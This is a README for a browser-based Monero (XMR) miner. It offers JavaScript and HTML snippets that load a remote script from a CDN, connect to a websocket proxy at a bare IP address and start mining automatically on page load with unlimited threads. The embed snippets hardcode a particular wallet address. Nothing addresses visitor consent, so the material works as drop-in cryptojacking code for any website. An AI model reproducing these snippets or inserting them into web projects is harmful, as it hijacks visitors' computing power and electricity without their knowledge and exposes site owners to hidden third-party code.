## Monero Webminer

Html & Js code that allows Mining of XMR (Monero) on browsers


# Configure

In index.Html you can configure it your preferences

- Pool
- XMR Wallet
- Miner name
- Threads (-1 means unlimited)
- Miner Password (Optional, Moneroocean does not use password, if your pool does, it is usually "x")


```javascript
server = "wss://45.119.82.33:40725";
    var pool = "gulf.moneroocean.stream:80";
    var walletAddress = "INSERT YOUR ADDRESS HERE";
    var workerId = "INSERT NODE NAME"
    var threads = -1;
    var password = "";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
```
# Running

Open index.html in any web browser and it will automatically start mining.

# Use In Other Projects 


HTML
  
    <!-- Start Of Mining Code (HTML) -->
    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
    <script>
        server = "wss://45.119.82.33:40725";
        var pool = "moneroocean.stream";
        var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
        var workerId = "GH-XMR"
        var threads = -1;
        var password = "";
        startMining(pool, walletAddress, workerId, threads, password);
        throttleMiner = 20;
    </script>
    <!-- End Of Mining Code (HTML) -->
      

Javascript import snippet
  
    import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';


Javascript
    
    // Start Of Mining Code (Javascript)
    var script = document.createElement("script");
    script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
    document.head.appendChild(script);

    server = "wss://45.119.82.33:40725";
    var pool = "moneroocean.stream";
    var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
    var workerId = "GH-XMR"
    var threads = -1;
    var password = "";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
    // End Of Mining Code
